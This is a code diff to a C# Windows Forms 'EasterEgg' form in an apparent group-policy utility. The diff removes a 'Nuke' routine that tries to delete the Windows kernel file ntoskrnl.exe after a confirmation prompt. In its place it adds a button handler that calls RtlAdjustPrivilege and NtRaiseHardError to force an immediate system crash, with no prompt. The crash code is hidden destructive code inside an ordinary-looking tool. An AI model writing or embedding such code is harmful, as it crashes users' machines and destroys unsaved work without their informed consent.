@@ -1,12 +1,6 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Drawing;
-using System.IO;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
+using System.Runtime.InteropServices;
 using System.Windows.Forms;
 
 namespace Group_Policy_CC
@@ -17,6 +11,12 @@ namespace Group_Policy_CC
         {
             InitializeComponent();
         }
+
+        [DllImport("ntdll.dll")]
+        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+
+        [DllImport("ntdll.dll")]
+        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
 
         private void EasterEgg_Load(object sender, EventArgs e)
         {
@@ -34,7 +34,14 @@ namespace Group_Policy_CC
 
         private void Button1_Click(object sender, EventArgs e)
         {
-            this.Close();
+            if (!radioButton1.Checked && radioButton2.Checked)
+            {
+                this.Close();
+            }
+            else
+            {
+                MessageBox.Show("You must close the cover before aborting!", "Protocol", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+            }
         }
 
         private void RadioButton1_CheckedChanged(object sender, EventArgs e)
@@ -69,66 +76,10 @@ namespace Group_Policy_CC
 
         private void Nuke_Click(object sender, EventArgs e)
         {
-            NukeConfirmation();
-        }
-
-        private void NukeConfirmation()
-        {
-            DialogResult Decision;
-            Decision = MessageBox.Show("Are you absolutely sure you want to initiate havoc on Windows?", "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation);
-
-            if (Decision == DialogResult.Yes)
-            {
-                NukeSequence();
-            }
-            else if (Decision == DialogResult.No)
-            {
-                MessageBox.Show("Operation Aborted By User", "Aborted", MessageBoxButtons.OK, MessageBoxIcon.Stop);
-                this.Close();
-            }
-        }
-
-        private void NukeSequence()
-        {
-            DirectoryInfo TargetDir = new DirectoryInfo(Environment.SpecialFolder.System.ToString());
-
-            var BackupDir = Path.GetPathRoot(Environment.SystemDirectory) + "\\" + "NukePreservation";
-
-            try
-            {
-                Directory.CreateDirectory(BackupDir);
-            }
-            catch
-            {
-                MessageBox.Show("Operation Aborted - Backup Directory Creation Failed", "Aborted", MessageBoxButtons.OK, MessageBoxIcon.Stop);
-                Application.Exit();
-            }
-
-            foreach (var FiletoCopy in TargetDir.EnumerateFiles("ntoskrnl.exe"))
-            {
-                try
-                {
-                    FiletoCopy.CopyTo(BackupDir);
-                }
-                catch
-                {
-                    MessageBox.Show("Operation Aborted - Backup Failed", "Aborted", MessageBoxButtons.OK, MessageBoxIcon.Stop);
-                    Application.Exit();
-                }
-
-                foreach (var FiletoDelete in TargetDir.EnumerateFiles("ntoskrnl.exe"))
-                {
-                    try
-                    {
-                        FiletoDelete.Delete();
-                    }
-                    catch
-                    {
-                        MessageBox.Show("Operation Aborted - Nuke Failed", "Aborted", MessageBoxButtons.OK, MessageBoxIcon.Stop);
-                        Application.Exit();
-                    }
-                }
-            }
+            bool t1;
+            uint t2;
+            RtlAdjustPrivilege(19, true, false, out t1);
+            NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
         }
     }
 }
